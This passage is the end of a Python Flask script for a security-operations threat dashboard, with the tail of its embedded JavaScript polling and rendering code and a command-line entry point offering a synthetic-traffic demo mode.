      S.events = ev.slice().reverse().concat(S.events).slice(0, 1000);
    }
    if (al.length) { S.lastAl = al[al.length - 1].id; S.alerts = al.slice().reverse().concat(S.alerts).slice(0, 300); }
    S.blocklist = bl || {};
    renderStats(st); renderFilters(); renderEvents(); renderAlerts(); renderKeywords(); renderBlocklist();
    setStatus("live");
  } catch (e) { setStatus("down"); }
  finally { S.inflight = false; }
}

setInterval(() => { $("clock").textContent = new Date().toISOString().replace("T", " ").slice(0, 19) + " UTC"; }, 1000);
initMap(); renderFilters(); renderEvents(); renderAlerts();
poll(); setInterval(poll, 3000);
</script>
</body>
</html>"""


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SOC Threat Dashboard v3")
    parser.add_argument("--demo", action="store_true", help="stream synthetic attack traffic on start-up")
    parser.add_argument("--host", default=os.environ.get("SOC_HOST", "127.0.0.1"))
    parser.add_argument("--port", type=int, default=int(os.environ.get("SOC_PORT", "5000")))
    parser.add_argument("--debug", action="store_true", help="Flask debug mode (never expose publicly)")
    args = parser.parse_args()
    if args.demo:
        threading.Timer(1.5, start_demo).start()
    print(f"SOC Threat Dashboard v3 · {RULE_COUNT} rules · http://{args.host}:{args.port}")
    app.run(host=args.host, port=args.port, debug=args.debug, threaded=True, use_reloader=False)
